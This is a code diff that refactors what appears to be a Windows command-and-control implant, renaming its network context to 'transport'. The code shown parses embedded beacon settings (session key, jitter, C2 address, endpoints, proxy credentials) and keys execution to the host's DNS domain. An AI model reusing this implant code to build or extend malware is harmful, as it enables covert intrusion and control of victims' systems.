@@ -27,7 +27,7 @@ namespace Main {
             if (!CheckTime()) {
                 continue;
             }
-            if (!ctx->session.checkin && !ctx->message_queue) {
+            if (!ctx->session.checkin && !ctx->transport.message_queue) {
                 if (!EnumSystem()) {
                     break;
                 }
@@ -118,8 +118,8 @@ namespace Main {
     name_len = MAX_PATH;
 
     if (ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
-        if (ctx->network.domain[0]) {
-            if (MbsBoundCompare(ctx->network.domain, buffer, MbsLength(ctx->network.domain)) != 0) {
+        if (ctx->transport.domain[0]) {
+            if (MbsBoundCompare(ctx->transport.domain, buffer, MbsLength(ctx->transport.domain)) != 0) {
                 // LOG ERROR (bad domain)
                 success = true;
                 goto defer;
@@ -334,8 +334,8 @@ namespace Main {
         CreateParser(&parser, Config, sizeof(Config));
         MemSet(Config, 0, sizeof(Config));
 
-        ctx->message_queue		= nullptr;
-        ctx->session.peer_id	= UnpackUint32(&parser);
+        ctx->transport.message_queue  = nullptr;
+        ctx->session.peer_id	      = UnpackUint32(&parser);
 
         ParserMemcpy(&parser, &ctx->config.session_key, nullptr);
 
@@ -352,34 +352,34 @@ namespace Main {
         ctx->config.jitter          = UnpackUint32(&parser);
 
 #ifdef TRANSPORT_HTTP
-        ctx->network.http = (_http_context*) Malloc(sizeof(_http_context));
+        ctx->transport.http = (_http_context*) Malloc(sizeof(_http_context));
 
-        ctx->network.http->handle     = nullptr;
-        ctx->network.http->endpoints  = nullptr;
-        ctx->network.http->headers    = nullptr;
+        ctx->transport.http->handle     = nullptr;
+        ctx->transport.http->endpoints  = nullptr;
+        ctx->transport.http->headers    = nullptr;
 
-        ParserWcscpy(&parser, &ctx->network.http->useragent, nullptr);
-        ParserWcscpy(&parser, &ctx->network.http->address, nullptr  );
-        ctx->network.http->port = (int) UnpackUint32(&parser);
-        ParserStrcpy(&parser, &ctx->network.domain, nullptr);
+        ParserWcscpy(&parser, &ctx->transport.http->useragent, nullptr);
+        ParserWcscpy(&parser, &ctx->transport.http->address, nullptr  );
+        ctx->transport.http->port = (int) UnpackUint32(&parser);
+        ParserStrcpy(&parser, &ctx->transport.domain, nullptr);
 
-        ctx->network.http->n_endpoints = UnpackUint32(&parser);
-        ctx->network.http->endpoints  = (wchar_t**) Malloc(sizeof(wchar_t*) * ((ctx->network.http->n_endpoints + 1)));
+        ctx->transport.http->n_endpoints = UnpackUint32(&parser);
+        ctx->transport.http->endpoints  = (wchar_t**) Malloc(sizeof(wchar_t*) * ((ctx->transport.http->n_endpoints + 1)));
 
-        for (auto i = 0; i < ctx->network.http->n_endpoints; i++) {
-            ParserWcscpy(&parser, &ctx->network.http->endpoints[i], nullptr);
+        for (auto i = 0; i < ctx->transport.http->n_endpoints; i++) {
+            ParserWcscpy(&parser, &ctx->transport.http->endpoints[i], nullptr);
         }
 
-        ctx->network.http->endpoints[ctx->network.http->n_endpoints] = nullptr;
-        ctx->network.b_proxy = UnpackBool(&parser);
+        ctx->transport.http->endpoints[ctx->transport.http->n_endpoints] = nullptr;
+        ctx->transport.b_proxy = UnpackBool(&parser);
 
-        if (ctx->network.b_proxy) {
-            ctx->network.http->proxy = (_proxy*) Malloc(sizeof(_proxy));
-            ctx->network.http->access = INTERNET_OPEN_TYPE_PROXY;
+        if (ctx->transport.b_proxy) {
+            ctx->transport.http->proxy = (_proxy*) Malloc(sizeof(_proxy));
+            ctx->transport.http->access = INTERNET_OPEN_TYPE_PROXY;
 
-            ParserWcscpy(&parser, &ctx->network.http->proxy->address, nullptr );
-            ParserWcscpy(&parser, &ctx->network.http->proxy->username, nullptr );
-            ParserWcscpy(&parser, &ctx->network.http->proxy->password, nullptr );
+            ParserWcscpy(&parser, &ctx->transport.http->proxy->address, nullptr );
+            ParserWcscpy(&parser, &ctx->transport.http->proxy->username, nullptr );
+            ParserWcscpy(&parser, &ctx->transport.http->proxy->password, nullptr );
         }
 #endif
 #ifdef TRANSPORT_PIPE
